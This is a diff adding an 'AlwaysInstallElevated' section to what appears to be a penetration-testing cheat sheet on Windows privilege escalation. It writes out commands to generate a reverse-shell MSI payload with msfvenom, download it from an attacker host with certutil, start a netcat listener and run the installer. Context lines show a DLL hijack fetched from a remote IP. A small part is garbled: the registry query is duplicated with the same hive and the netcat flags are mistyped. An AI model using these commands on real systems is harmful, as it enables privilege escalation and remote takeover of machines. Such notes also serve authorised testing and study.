@@ -269,6 +269,16 @@ Replace and restart service:
 iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
 Restart-Service BetaService
 ```
+##### AlwaysInstallElevated
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
+certutil.exe -urlcache -f http://10.0.2.5:8888/evil.msi evil.msi
+sudo rlwrap nc- nlvp 443
+evil.msi
+```
 
 ##### Named Pipes(PrintSpoofer)
 ```
